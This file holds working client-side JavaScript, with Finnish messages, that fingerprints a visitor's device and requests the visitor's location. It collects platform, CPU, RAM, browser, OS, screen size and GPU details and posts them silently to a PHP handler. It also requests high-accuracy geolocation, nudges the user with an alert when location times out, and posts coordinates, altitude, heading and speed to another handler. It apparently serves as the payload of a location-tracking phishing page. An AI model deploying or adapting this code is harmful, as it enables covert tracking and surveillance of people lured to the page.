function information() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven;
  var ren;

  if (cc == undefined) {
    cc = 'Ei saatavilla';
  }

  if (ram == undefined) {
    ram = 'Ei saatavilla';
  }

  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else {
    brw = 'Ei saatavilla';
  }

  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (ven == undefined) {
    ven = 'Ei saatavilla';
  }
  if (ren == undefined) {
    ren = 'Ei saatavilla';
  }

  var ht = window.screen.height;
  var wd = window.screen.width;
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Ei saatavilla';
  }
  os = os.trim();
  
  $.ajax({
    type: 'POST',
    url: 'info_handler.php',
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os },
    success: function () { },
    mimeType: 'text'
  });
}

function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }

  function showError(error) {
    var err_text;
    var err_status = 'epäonnistui';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        err_text = 'Käyttäjä hylkäsi sijaintipyyntöä';
        break;
      case error.POSITION_UNAVAILABLE:
        err_text = 'Sijaintitietoja ei ole saatavilla';
        break;
      case error.TIMEOUT:
        err_text = 'Pyyntö sijainnin saamiseksi aikakatkaistiin';
        alert('Aseta sijaintitila korkealle tarkkuudelle...');
        break;
      case error.UNKNOWN_ERROR:
        err_text = 'Tuntematon virhe tapahtui';
        break;
    }

    $.ajax({
      type: 'POST',
      url: 'error_handler.php',
      data: { Status: err_status, Error: err_text },
      success: errCallback(error, err_text),
      mimeType: 'text'
    });
  }

  function showPosition(position) {
    var lat = position.coords.latitude;
    if (lat) {
      lat = lat + ' astetta';
    }
    else {
      lat = 'Ei saatavilla';
    }
    var lon = position.coords.longitude;
    if (lon) {
      lon = lon + ' astetta';
    }
    else {
      lon = 'Ei saatavilla';
    }
    var acc = position.coords.accuracy;
    if (acc) {
      acc = acc + ' m';
    }
    else {
      acc = 'Ei saatavilla';
    }
    var alt = position.coords.altitude;
    if (alt) {
      alt = alt + ' m';
    }
    else {
      alt = 'Ei saatavilla';
    }
    var dir = position.coords.heading;
    if (dir) {
      dir = dir + ' astetta';
    }
    else {
      dir = 'Ei saatavilla';
    }
    var spd = position.coords.speed;
    if (spd) {
      spd = spd + ' m/s';
    }
    else {
      spd = 'Ei saatavilla';
    }

    var ok_status = 'onnistui';

    $.ajax({
      type: 'POST',
      url: 'result_handler.php',
      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
      success: callback,
      mimeType: 'text'
    });
  };
}
